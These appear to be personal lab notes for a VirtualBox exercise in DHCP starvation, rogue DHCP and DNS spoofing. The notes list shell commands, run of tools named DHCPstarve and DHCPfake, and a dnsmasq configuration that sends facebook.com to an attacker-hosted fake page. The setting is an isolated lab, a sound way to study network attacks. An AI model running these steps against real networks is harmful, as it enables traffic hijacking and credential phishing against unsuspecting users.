https://stackoverflow.com/questions/14478167/bind-socket-to-network-interface

https://man7.org/linux/man-pages/man7/netdevice.7.html


ip addr

sudo ip addr add 102.168.56.1 dev enp0s3
sudo ip addr flush dev enp0s3

attack
sudo ./DHCPfake

victim
sudo dhclient -v enp0s3
sudo dhclient -r enp0s3
sudo ip addr flush dev enp0s3

APache
sudo /opt/lampp/lampp startapache
/opt/lampp/htdocs/index.html
<h1>This is not the real page</h1>
http://127.0.0.1

DNS
sudo nano /etc/bind/named.conf.local
sudo apt install dnsmasq -y
sudo nano /etc/dnsmasq.conf

# VirtualBox IP
listen-address=192.168.56.1
bind-interfaces 
address=/example.com/192.168.56.1

sudo ./DHCPfake




------------------------------------
TO TEST:
on attacker
sudo /opt/lampp/lampp startapache (index.html edited already)
sudo nano /etc/dnsmasq.conf
sudo systemctl restart dnsmasq

this added to conf file:
# to only listen on the VirtualBox IP
listen-address=192.168.56.1
# bind address so no sytem resolve
bind-interfaces

# The spoofed domain 
address=/facebook.com/192.168.56.1


on victim VM
sudo dhclient -r enp0s3
sudo ip addr flush dev enp0s3

on attacker (host)
sudo ./DHCPstarve
sudo ./DHCPfake - will wait for discover packet (ignores starve packets)

on victim VM
sudo dhclient -v enp0s3
wait until connects via vboxnet0
192.168.56.1 - is attacker
255.255.255.0 - mask

when conntected, in firefox
open facebook.com














